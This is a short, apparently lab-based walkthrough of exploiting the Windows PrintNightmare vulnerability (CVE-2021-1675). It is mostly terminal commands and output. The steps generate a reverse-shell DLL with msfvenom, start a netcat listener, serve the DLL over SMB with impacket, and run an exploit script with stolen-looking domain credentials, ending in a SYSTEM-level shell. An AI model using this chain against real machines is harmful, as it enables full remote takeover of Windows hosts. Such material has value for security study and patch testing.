Best installation : https://github.com/cube0x0/CVE-2021-1675/issues/19

Create a dll for reverse connection

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.200.101 LPORT=4444 -f dll -o reverse.dll
	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No encoder specified, outputting raw payload
	Payload size: 460 bytes
	Final size of dll file: 8704 bytes
	Saved as: reverse.dll


Start listener

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ nc -lvnp 4444                 
	listening on [any] 4444 ...


Start smb server for sharing dll

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce]
	└─$ sudo /usr/bin/impacket-smbserver share smb -smb2support
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

	[*] Config file parsed
	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
	[*] Config file parsed
	[*] Config file parsed
	[*] Config file parsed


Run exploit (i got error but still could get reverse shell somehow)

	┌──(PrintNightmare)(kali㉿kali)-[~/Desktop/printnightmare rce/CVE-2021-1675]
	└─$ python CVE-2021-1675.py valhalla/testuser:'Pass123!'@192.168.200.112 '\\192.168.200.101\share\reverse.dll'          
	[*] Connecting to ncacn_np:192.168.200.112[\PIPE\spoolss]
	[+] Bind OK
	[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
	[*] Executing \??\UNC\192.168.200.101\share\reverse.dll
	[*] Try 1...
	[*] Stage0: 0
	[*] Try 2...
	
Check back netcat listener

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [192.168.200.101] from (UNKNOWN) [192.168.200.112] 62863
	Microsoft Windows [Version 10.0.19043.928]
	(c) Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	whoami
	nt authority\system

	C:\Windows\system32>

